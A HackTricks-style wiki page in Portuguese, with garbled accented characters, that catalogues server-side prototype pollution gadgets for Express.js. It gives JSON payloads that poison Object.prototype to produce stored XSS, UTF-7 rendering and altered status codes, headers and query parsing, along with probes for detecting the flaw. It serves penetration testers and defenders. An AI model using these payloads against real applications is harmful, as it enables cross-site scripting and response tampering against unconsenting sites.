# Express Prototype Pollution Gadgets

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Serve XSS responses

**Para mais detalhes** [**d√™ uma olhada na pesquisa original**](https://portswigger.net/research/server-side-prototype-pollution)

### Mudar o tipo de conte√∫do JSON para HTML

Em um aplicativo Express usando uma **resposta de tipo de conte√∫do JSON** e refletindo um JSON:
```javascript
app.use(bodyParser.json({type: 'application/json'}));
app.post('/', function(req, res){
_.merge({}, req.body);
res.send(req.body);
});
```
Em esses casos, XSS normalmente n√£o √© poss√≠vel com um tipo de conte√∫do JSON. No entanto, com a polui√ß√£o de prot√≥tipos, podemos **confundir o Express para servir uma resposta HTML.** Essa vulnerabilidade depende da aplica√ß√£o usar **`res.send(obj)`** e usar o analisador de corpo com o tipo de conte√∫do application/json.
```json
{"__proto__":{"_body":true,"body":"<script>evil()"}}
```
Ao **poluir** as propriedades **`body`** e **`_body`**, √© poss√≠vel fazer com que **o Express sirva o tipo de conte√∫do HTML** e reflita a propriedade `_body`, resultando em XSS armazenado.

### Renderizar UTF7

√â poss√≠vel fazer o express **renderizar conte√∫do UTF-7 com**:
```json
{"__proto__":{"content-type": "application/json; charset=utf-7"}}
```
## T√©cnicas de Escaneamento Seguras

### Espa√ßos JSON

O seguinte PP far√° com que atributos dentro de um JSON tenham um espa√ßo extra que n√£o quebrar√° a funcionalidade:
```json
{"__proto__":{"json spaces": " "}}
```
Ent√£o um JSON refletido ficar√° assim:
```json
{"foo":  "bar"} -- Note the extra space
```
### Exposed Headers

O seguinte gadget de PP far√° com que o servidor retorne o cabe√ßalho HTTP: **`Access-Control-Expose_headers: foo`**
```json
{"__proto__":{"exposedHeaders":["foo"]}}
```
Requer o **m√≥dulo CORS instalado**

### **M√©todo OPTIONS**

Com o seguinte payload, √© poss√≠vel **ocultar um m√©todo de uma resposta OPTIONS**:
```javascript
// Original reponse: POST,GET,HEAD

// Payload:
{"__proto__":{"head":true}}

//New response: POST;GET
```
### **Status**

√â poss√≠vel alterar o **c√≥digo de status retornado** usando a seguinte carga √∫til de PP:
```json
{"__proto__":{"status":510}}
```
### Erro

Quando voc√™ atribui a um prot√≥tipo com um primitivo como uma string, isso produz uma **opera√ß√£o no-op, uma vez que o prot√≥tipo deve ser um objeto**. Se voc√™ tentar atribuir um objeto prot√≥tipo ao `Object.prototype` em si, isso **gerar√° uma exce√ß√£o**. Podemos usar esses dois comportamentos para **detectar se a polui√ß√£o do prot√≥tipo foi bem-sucedida**:
```javascript
({}).__proto__.__proto__={}//throws type exception
({}).__proto__.__proto__="x"//no-op does not throw exception
```
### Valor Refletido

Quando uma aplica√ß√£o inclui um objeto em sua resposta, criar um atributo com um **nome incomum junto com `__proto__`** pode ser revelador. Especificamente, se **apenas o atributo incomum for retornado** na resposta, isso pode indicar a vulnerabilidade da aplica√ß√£o:
```json
{"unusualName":"value","__proto__":"test"}
```
Al√©m disso, em cen√°rios onde uma biblioteca como Lodash √© empregada, definir uma propriedade tanto via polui√ß√£o de prot√≥tipo (PP) quanto diretamente dentro do objeto oferece outra abordagem diagn√≥stica. Se tal propriedade for omitida da resposta, isso sugere que Lodash est√° verificando a exist√™ncia da propriedade no objeto alvo antes de mesclar:
```javascript
{"__proto__":{"a":"value1"},"a":"value2","b":"value3"}
// If 'b' is the only property reflected, this indicates prototype pollution in Lodash
```
## Misc

### Allow Dots

H√° uma op√ß√£o no Express que permite **criar objetos a partir de par√¢metros de string de consulta**.\
Voc√™ definitivamente poderia us√°-la em uma **cadeia** de bugs para explorar uma **vulnerabilidade de polui√ß√£o de prot√≥tipo**.
```json
{"__proto__":{"allowDots":true}}
```
**`?foo.bar=baz` cria um objeto no Node.**

## Refer√™ncias

* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)


{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}
